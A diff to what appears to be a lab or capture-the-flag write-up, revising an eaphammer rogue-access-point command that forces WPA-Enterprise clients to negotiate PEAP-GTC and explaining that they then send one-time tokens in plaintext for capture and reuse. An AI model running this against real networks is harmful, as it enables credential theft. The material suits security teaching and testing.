@@ -58,13 +58,15 @@ eaphammer --interface wlan0 \
           --essid "<target ent SSID>" \
           --creds \
           --auth wpa-eap \
-          --negotiate downgrade   # forces PEAP-GTC where possible
+          --negotiate manual \
+          --phase-1-methods PEAP \
+          --phase-2-methods GTC,MSCHAPV2   # prefer GTC where possible
 ```
 
-`--negotiate downgrade` is the interesting knob: if the client
-supports EAP-GTC, eaphammer negotiates it (over PEAP) and the
-client sends the token **in plaintext**. The token is often a
-one-time OTP; capture it within its validity window and it is
+`--negotiate manual --phase-2-methods GTC,MSCHAPV2` is the interesting
+knob: if the client supports EAP-GTC, eaphammer negotiates it (over
+PEAP) and the client sends the token **in plaintext**. The token is
+often a one-time OTP; capture it within its validity window and it is
 directly usable.
 
 ## The flag surface
